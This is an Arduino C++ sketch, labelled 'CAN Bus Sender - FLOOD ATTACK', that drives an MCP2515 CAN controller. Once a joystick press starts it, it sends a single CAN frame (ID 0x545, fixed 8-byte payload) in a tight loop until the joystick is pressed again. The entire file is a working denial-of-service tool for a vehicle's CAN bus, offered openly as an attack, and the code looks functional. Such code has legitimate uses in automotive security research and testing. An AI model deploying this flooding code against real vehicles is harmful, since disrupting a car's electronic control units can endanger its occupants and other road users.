/****************************************************************************
                  (MCP2515) CAN Bus Sender - FLOOD ATTACK
                    
Author: Samuel De La Motte
Contact: samuel.delamotte1@gmail.com
Date: 26/05/2020
Version: 1.0

Based off the Arduino tutorial found at the following link:
https://www.instructables.com/id/Hack-your-vehicle-CAN-BUS-with-Arduino-and-Seeed-C/
*****************************************************************************/
//*******************************LIBRARIES**********************************//
#include <SPI.h>
#include "mcp_can.h"

//******************************DEFINITIONS*********************************//
// Serial port data rate
#define SERIAL_SPEED 115200

// CAN bus data rate
#define CAN_BITRATE 500

// Joystick click pin
#define CLICK A4

//Define LED pins
#define LED2 8
#define LED3 7

//************************CAN MESSAGE CONFIGURATION*************************//
// CAN message ID (in HEX), payload and length
unsigned long ID = 0x545;  // 1349
unsigned long LENGTH = 8;
unsigned char PAYLOAD[8] = {0, 1, 2, 3, 4, 5, 6, 7};

//*******************************CONSTANTS**********************************//
// Initialise chip select pins
const int CAN_CS_PIN = 10; // MCP2515 pin

// Set the CAN bus speed according to CAN_BITRATE
#if (CAN_BITRATE == 500)
  const byte CAN_SPEED = CAN_500KBPS;
#elif (CAN_BITRATE == 250)
  const byte CAN_SPEED = CAN_250KBPS;
#elif (CAN_BITRATE == 125)
  const byte CAN_SPEED = CAN_125KBPS;
#else
  const byte CAN_SPEED = CAN_500KBPS;
#endif

//********************************GLOBALS***********************************//
// CAN Object
MCP_CAN CAN(CAN_CS_PIN);
int count = 0;

//*******************************SETUP LOOP*********************************//
void setup() {
  // Initialise pins
  pinMode(CLICK,INPUT);
  pinMode(LED2, OUTPUT);
  pinMode(LED3, OUTPUT);

  // Pull analog pins high to enable reading of joystick click
  digitalWrite(CLICK, HIGH);
  
  // Write LED pins low to turn them off by default
  digitalWrite(LED2, LOW);
  digitalWrite(LED3, LOW);

  // Initialise serial bus
  Serial.begin(SERIAL_SPEED);
  if (Serial) {
    Serial.print("[INFO] - SERIAL SPEED: "); Serial.println(SERIAL_SPEED);
  } else {
    while (1) {
      Serial.println("[ERROR] - CAN'T INITIALISE USB SERIAL");
      delay(100);
    }
  }

  // Initialise MCP2515 CAN controller at the specified speed
  Serial.print("[INFO] - CAN BITRATE: "); Serial.println(CAN_BITRATE);
  byte canSpeed = CAN_SPEED;
  while (CAN.begin(canSpeed) != CAN_OK) {
    Serial.println("[ERROR] - CAN'T INITIALISE CAN");
    delay(100);
  }
  
  // CAN sender is ready
  Serial.println("[INFO] - SYSTEM READY");
}

//********************************MAIN LOOP*********************************//
void loop() {
START:
  // Pause the program to wait for the user to press the joystick
  count = 0;
  delay(1000);
  while (digitalRead(CLICK)==HIGH) {
      // Wait again for joystick press
      if (count == 0) {
        Serial.println("[PAUSED] - Press the joystick to begin.");
        count = 1;
      }
  }

  Serial.println("[INFO] - SYSTEM STARTING...");
  Serial.println("3");
  delay(1000);
  Serial.println("2");
  delay(1000);
  Serial.println("1");
  delay(1000);

  // Sending the CAN message
  while (digitalRead(CLICK)==HIGH) {
    // Turn on LED to indicate CAN Bus traffic
    digitalWrite(LED3, HIGH);
    
    // Send CAN message
    CAN.sendMsgBuf(ID,0,LENGTH,PAYLOAD); // 0 means standard frame length, 1 is extended
    
    // Turn off LED3
    digitalWrite(LED3, LOW);
  }
  // User pressed the joystick again, stop sending can message
  goto START;
}
